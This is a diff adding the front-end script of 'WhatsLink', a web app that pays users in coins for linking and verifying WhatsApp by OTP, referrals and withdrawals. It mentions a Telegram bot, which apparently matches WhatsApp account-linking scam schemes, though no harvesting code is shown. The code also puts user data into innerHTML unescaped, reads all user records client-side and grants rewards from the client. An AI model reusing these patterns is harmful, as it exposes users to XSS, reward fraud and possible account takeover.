+    document.querySelectorAll('.otp-digit').forEach((input, index) => {
+        input.addEventListener('input', function(e) {
+            if (this.value.length === 1) {
+                const next = document.querySelector(`.otp-digit[data-index="${index + 1}"]`);
+                if (next) next.focus();
+            }
+        });
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value) {
+                const prev = document.querySelector(`.otp-digit[data-index="${index - 1}"]`);
+                if (prev) prev.focus();
+            }
+            if (e.key === 'Enter') verifyOTP();
+        });
+    });
+});
+
+// ============================================================
+// UI FUNCTIONS
+// ============================================================
+async function updateUI() {
+    const user = auth.currentUser;
+    const guestActions = document.getElementById('guestActions');
+    const userActions = document.getElementById('userActions');
+
+    if (user) {
+        guestActions.style.display = 'none';
+        userActions.style.display = 'flex';
+
+        const userData = await DB.getUserData(user.uid);
+
+        // Avatar
+        const initial = (userData?.name || 'U').charAt(0).toUpperCase();
+        document.querySelectorAll('#userAvatar, #profileAvatar').forEach(el => el.textContent = initial);
+
+        // Name
+        document.getElementById('userNameDisplay').textContent = userData?.name || 'User';
+        document.getElementById('profileName').textContent = userData?.name || 'User';
+        document.getElementById('profileUID').textContent = user.uid || '---';
+        document.getElementById('profileEmail').textContent = userData?.email || user.email || '---';
+
+        // Status
+        const statusEl = document.getElementById('userStatus');
+        if (userData?.whatsappVerified) {
+            statusEl.className = 'user-status verified';
+            statusEl.innerHTML = '✅ WhatsApp Linked';
+        } else {
+            statusEl.className = 'user-status pending';
+            statusEl.innerHTML = '🔗 Link WhatsApp';
+        }
+
+        // Coins
+        const coins = userData?.coins || 0;
+        document.getElementById('profileCoins').textContent = coins;
+        document.getElementById('profileEarned').textContent = '₨ ' + ((userData?.totalEarned || 0) * 0.5).toFixed(0);
+        document.getElementById('profileWithdrawn').textContent = '₨ ' + (userData?.totalWithdrawn || 0).toFixed(0);
+        document.getElementById('profileRefs').textContent = userData?.referrals?.length || 0;
+        document.getElementById('withdrawBalance').textContent = coins.toLocaleString();
+        document.getElementById('withdrawPKR').textContent = (coins * 0.5).toFixed(0);
+
+        // Profile details
+        document.getElementById('pName').textContent = userData?.name || '---';
+        document.getElementById('pEmail').textContent = userData?.email || user.email || '---';
+        document.getElementById('pWA').textContent = userData?.whatsappVerified ? '✅ Verified: ' + (userData.whatsappPhone || '---') : '❌ Not Verified';
+        document.getElementById('pRefCode').textContent = userData?.referralCode || '---';
+        document.getElementById('pJoined').textContent = userData?.joinedDate ? new Date(userData.joinedDate).toLocaleDateString() : '---';
+
+        // Referral link
+        const link = document.getElementById('referralLinkInput');
+        if (link) {
+            link.value = window.location.href.split('#')[0] + '?ref=' + (userData?.referralCode || '');
+        }
+
+        // WhatsApp Status
+        const badge = document.getElementById('waStatusBadge');
+        const phoneDisplay = document.getElementById('waPhoneDisplay');
+        const phoneNumber = document.getElementById('waPhoneNumber');
+        const linkBtn = document.getElementById('waLinkBtn');
+
+        if (userData?.whatsappVerified) {
+            badge.style.background = 'var(--whatsapp-light)';
+            badge.style.color = 'var(--primary)';
+            badge.innerHTML = '✅ Verified';
+            phoneDisplay.style.display = 'block';
+            phoneNumber.textContent = userData.whatsappPhone || '---';
+            linkBtn.textContent = 'Linked ✅';
+            linkBtn.disabled = true;
+            linkBtn.style.opacity = '0.6';
+        } else {
+            badge.style.background = '#fde8e8';
+            badge.style.color = 'var(--danger)';
+            badge.innerHTML = '❌ Not Linked';
+            phoneDisplay.style.display = 'none';
+            linkBtn.textContent = 'Link Now';
+            linkBtn.disabled = false;
+            linkBtn.style.opacity = '1';
+        }
+
+        // Stats
+        const stats = await DB.getStats();
+        document.getElementById('statUsers').textContent = stats.total || 0;
+        document.getElementById('statLinked').textContent = stats.linked || 0;
+        document.getElementById('statActive').textContent = stats.active || 0;
+
+        // Ref stats
+        document.getElementById('refCount').textContent = userData?.referrals?.length || 0;
+        document.getElementById('refCoins').textContent = ((userData?.referrals?.length || 0) * 500).toLocaleString();
+
+        // Leaderboard
+        const leaders = await DB.getLeaderboard(5);
+        const lbList = document.getElementById('leaderboardList');
+        if (leaders.length === 0) {
+            lbList.innerHTML = '<div style="font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);text-align:center;padding:10px 0;">No referrals yet</div>';
+        } else {
+            lbList.innerHTML = leaders.map((u, i) => `
+                <div style="display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--border);">
+                    <div style="width:22px;height:22px;border-radius:50%;background:${i === 0 ? 'var(--coin)' : i === 1 ? '#c0c0c0' : i === 2 ? '#cd7f32' : 'var(--bg-soft)'};color:${i < 3 ? 'white' : 'var(--text)'};display:flex;align-items:center;justify-content:center;font-weight:700;font-size:10px;">${i + 1}</div>
+                    <div style="flex:1;font-size:clamp(12px,1.6vw,13px);font-weight:600;">${u.name || 'User'}</div>
+                    <div style="font-size:clamp(10px,1.4vw,11px);color:var(--text-mute);">${u.referrals?.length || 0} refs</div>
+                </div>
+            `).join('');
+        }
+
+        // Transactions
+        const tx = await DB.getWithdrawals(user.uid);
+        const txContainer = document.getElementById('txHistory');
+        if (tx.length === 0) {
+            txContainer.innerHTML = '<div style="font-size:clamp(11px,1.6vw,12px);color:var(--text-mute);text-align:center;padding:10px 0;">No transactions yet</div>';
+        } else {
+            txContainer.innerHTML = tx.map(w => `
+                <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border);font-size:clamp(11px,1.6vw,12px);">
+                    <div>
+                        <div style="font-weight:600;">${w.method === 'jazzcash' ? 'JazzCash' : 'EasyPaisa'}</div>
+                        <div style="color:var(--text-mute);font-size:clamp(9px,1.2vw,10px);">${new Date(w.date).toLocaleDateString()}</div>
+                    </div>
+                    <div style="text-align:right;">
+                        <div style="font-weight:700;">₨ ${w.amount.toFixed(0)}</div>
+                        <span style="font-size:clamp(9px,1.2vw,10px);color:${w.status === 'pending' ? 'var(--coin)' : 'var(--whatsapp)'};">${w.status}</span>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Rank
+        const allUsers = await rtdb.ref('users').once('value');
+        const users = allUsers.val() || {};
+        const ranked = Object.values(users)
+            .filter(u => u.referrals && u.referrals.length > 0)
+            .sort((a, b) => (b.referrals?.length || 0) - (a.referrals?.length || 0));
+        const rank = ranked.findIndex(u => u.uid === user.uid) + 1;
+        document.getElementById('refRank').textContent = rank > 0 ? '#' + rank : '#--';
+
+        // Tasks
+        renderTasks();
+
+    } else {
+        guestActions.style.display = 'flex';
+        userActions.style.display = 'none';
+    }
+}
+
+// ============================================================
+// TASKS
+// ============================================================
+const TASKS = [
+    { id: 'welcome', title: 'Welcome Bonus', category: 'daily', reward: 200, icon: 'fa-gift', desc: 'Complete your profile.' },
+    { id: 'dailylog', title: 'Daily Login', category: 'daily', reward: 50, icon: 'fa-calendar-check', desc: 'Login daily to collect.' },
+    { id: 'whatsapp_link', title: 'Link WhatsApp', category: 'whatsapp', reward: 300, icon: 'fa-whatsapp', desc: 'Link your WhatsApp number.' },
+    { id: 'whatsapp_verify', title: 'Verify WhatsApp OTP', category: 'whatsapp', reward: 200, icon: 'fa-check-circle', desc: 'Verify OTP sent to WhatsApp.' },
+    { id: 'share5', title: 'Share with 5 Friends', category: 'share', reward: 300, icon: 'fa-share-nodes', desc: 'Share referral link with 5 friends.' },
+    { id: 'referral', title: 'Refer a Friend', category: 'referral', reward: 500, icon: 'fa-user-plus', desc: 'Friend registers using your link.' }
+];
+
+let taskFilter = 'all';
+
+async function renderTasks() {
+    const user = auth.currentUser;
+    const container = document.getElementById('tasksList');
+    const userData = user ? await DB.getUserData(user.uid) : null;
+
+    if (!user || !userData) {
+        container.innerHTML = '<div style="text-align:center;padding:20px;color:var(--text-mute);font-size:clamp(12px,1.6vw,13px);">Please login to view tasks.</div>';
+        return;
+    }
+
+    const filtered = taskFilter === 'all' ? TASKS : TASKS.filter(t => t.category === taskFilter);
+
+    container.innerHTML = filtered.map(t => {
+        const isWATask = t.category === 'whatsapp';
+        const waRequired = isWATask && !userData.whatsappVerified;
+        const done = (userData.tasksCompleted && userData.tasksCompleted[t.id] && 
+                     userData.tasksCompleted[t.id].includes(new Date().toISOString().split('T')[0]));
+
+        return `
+            <div class="task-item ${waRequired ? 'locked' : ''}" style="${waRequired ? 'position:relative;' : ''}">
+                <div class="task-icon"><i class="fas ${t.icon}"></i></div>
+                <div class="task-info">
+                    <h4>${t.title} ${isWATask ? '🔗' : ''}</h4>
+                    <p>${t.desc}</p>
+                    <span style="font-size:clamp(9px,1.2vw,10px);color:var(--text-mute);text-transform:capitalize;">${t.category}</span>
+                </div>
+                <div style="text-align:right;">
+                    <div class="task-reward"><i class="fas fa-coins"></i> ${t.reward}</div>
+                    ${done ?
+                        '<span style="font-size:clamp(9px,1.2vw,10px);color:var(--whatsapp);font-weight:600;"><i class="fas fa-check-circle"></i> Done</span>' :
+                        waRequired ?
+                        `<button class="btn btn-primary btn-sm" style="padding:3px 10px;font-size:clamp(9px,1.2vw,10px);margin-top:3px;background:var(--danger);" onclick="openOTPPage()">Link First</button>` :
+                        `<button class="btn btn-primary btn-sm" style="padding:3px 10px;font-size:clamp(9px,1.2vw,10px);margin-top:3px;" onclick="doTask('${t.id}', ${t.reward})">Start</button>`
+                    }
+                </div>
+            </div>
+        `;
+    }).join('');
+
+    // Quick tasks for home
+    const quickContainer = document.getElementById('quickTasks');
+    const quickTasks = TASKS.slice(0, 4);
+    quickContainer.innerHTML = quickTasks.map(t => `
+        <div class="task-item">
+            <div class="task-icon"><i class="fas ${t.icon}"></i></div>
+            <div class="task-info">
+                <h4>${t.title}</h4>
+                <p>${t.desc.substring(0, 30)}...</p>
+            </div>
+            <div class="task-reward"><i class="fas fa-coins"></i> ${t.reward}</div>
+        </div>
+    `).join('');
+}
+
+async function doTask(taskId, reward) {
+    const user = auth.currentUser;
+    if (!user) { showToast('Please login first', 'error'); return; }
+
+    try {
+        const result = await DB.completeTask(user.uid, taskId, reward);
+        showToast('✅ Task complete! +' + reward + ' coins', 'success');
+        updateUI();
+    } catch(err) {
+        showToast(err.message, 'error');
+    }
+}
+
+// ============================================================
+// REFERRAL FUNCTIONS
+// ============================================================
+function copyReferralLink() {
+    const input = document.getElementById('referralLinkInput');
+    if (!input || !input.value) { showToast('Please login first', 'error'); return; }
+    navigator.clipboard.writeText(input.value).then(() => {
+        showToast('Link copied! 📋', 'success');
+    }).catch(() => {
+        input.select();
+        document.execCommand('copy');
+        showToast('Link copied! 📋', 'success');
+    });
+}
+
+function shareWA() {
+    const link = document.getElementById('referralLinkInput').value;
+    if (!link) { showToast('Please login first', 'error'); return; }
+    window.open('https://wa.me/?text=' + encodeURIComponent('Join WhatsLink and earn real money! Use my link: ' + link), '_blank');
+}
+
+function shareFB() {
+    const link = document.getElementById('referralLinkInput').value;
+    if (!link) { showToast('Please login first', 'error'); return; }
+    window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(link), '_blank');
+}
+
+function shareTW() {
+    const link = document.getElementById('referralLinkInput').value;
+    if (!link) { showToast('Please login first', 'error'); return; }
+    window.open('https://twitter.com/intent/tweet?text=Join%20WhatsLink%20and%20earn%20real%20money!&url=' + encodeURIComponent(link), '_blank');
+}
+
+// ============================================================
+// WITHDRAW
+// ============================================================
+async function requestWithdraw(e) {
+    e.preventDefault();
+    const user = auth.currentUser;
+    if (!user) { showToast('Please login first', 'error'); return; }
+
+    try {
+        const coins = parseInt(document.getElementById('wCoins').value);
+        const method = document.getElementById('wMethod').value;
+        const account = document.getElementById('wAccount').value.trim();
+
+        if (!coins || coins < 1000) throw new Error('Minimum 1000 coins');
+        if (coins > 10000) throw new Error('Maximum 10000 coins');
+        if (!method) throw new Error('Select method');
+        if (!account || account.length < 10) throw new Error('Enter valid account');
+
+        const result = await DB.requestWithdrawal(user.uid, coins, method, account);
+        showToast('Withdrawal submitted! 💰', 'success');
+        document.getElementById('wCoins').value = '';
+        document.getElementById('wAccount').value = '';
+        updateUI();
+    } catch(err) {
+        showToast(err.message, 'error');
+    }
+}
+
+// ============================================================
+// NAVIGATION
+// ============================================================
+let currentPage = 'home';
+
+function navigate(page) {
+    const user = auth.currentUser;
+    if (!user && ['tasks', 'profile', 'agents', 'otp'].includes(page)) {
+        page = 'home';
+        showToast('Please login first', 'error');
+    }
+
+    currentPage = page;
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const target = document.getElementById('page-' + page);
+    if (target) target.classList.add('active');
+
+    document.querySelectorAll('.bottom-nav a').forEach(a => {
+        a.classList.toggle('active', a.dataset.page === page);
+    });
+
+    document.querySelector('.bottom-nav').style.display = page === 'otp' ? 'none' : 'flex';
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+// ============================================================
+// TOAST
+// ============================================================
+function showToast(message, type = 'success') {
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.className = 'toast ' + type;
+    toast.classList.add('show');
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(() => toast.classList.remove('show'), 3000);
+}
+
+// ============================================================
+// FAQ
+// ============================================================
+function toggleFaq(el) {
+    const item = el.closest('.faq-item');
+    item.classList.toggle('open');
+}
+
+// ============================================================
+// DROPDOWN
+// ============================================================
+function toggleDropdown() {
+    document.getElementById('dropdownMenu').classList.toggle('show');
+}
+document.addEventListener('click', function(e) {
+    const menu = document.getElementById('dropdownMenu');
+    const profile = document.querySelector('.user-profile');
+    if (menu && profile && !profile.contains(e.target)) {
+        menu.classList.remove('show');
+    }
+});
+
+// ============================================================
+// AUTH OVERLAY
+// ============================================================
+function showAuth(type) {
+    document.getElementById('loginOverlay').classList.toggle('show', type === 'login');
+    document.getElementById('registerOverlay').classList.toggle('show', type === 'register');
+}
+
+function hideAuth() {
+    document.getElementById('loginOverlay').classList.remove('show');
+    document.getElementById('registerOverlay').classList.remove('show');
+}
+
+// ============================================================
+// SUPPORT
+// ============================================================
+function sendSupport(e) {
+    e.preventDefault();
+    showToast('Message sent! 📧', 'success');
+    e.target.reset();
+}
+
+// ============================================================
+// FILTER
+// ============================================================
+document.addEventListener('click', function(e) {
+    const chip = e.target.closest('[data-cat]');
+    if (chip) {
+        taskFilter = chip.dataset.cat;
+        document.querySelectorAll('[data-cat]').forEach(btn => {
+            const isActive = btn.dataset.cat === taskFilter;
+            btn.className = 'btn btn-sm ' + (isActive ? 'btn-primary' : 'btn-outline');
+            btn.style.padding = '4px 10px';
+            btn.style.fontSize = 'clamp(9px,1.4vw,11px)';
+        });
+        renderTasks();
+    }
+});
+
+// ============================================================
+// AUTH STATE LISTENER
+// ============================================================
+auth.onAuthStateChanged(async (user) => {
+    if (user) {
+        console.log('✅ User logged in:', user.uid);
+        await updateUI();
+        renderTasks();
+    } else {
+        console.log('❌ User logged out');
+        updateUI();
+    }
+});
+
+// ============================================================
+// INIT
+// ============================================================
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('🚀 WhatsLink - Complete System');
+    console.log('📱 Firebase + Telegram Bot Integration');
+    console.log('🔗 Real WhatsApp Link with OTP');
+
+    // Check URL for referral
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get('ref');
+    if (ref && !auth.currentUser) {
+        document.getElementById('regReferral').value = ref;
+        showAuth('register');
+    }
+
+    updateUI();
+});
+</script>
+</body>
+</html>
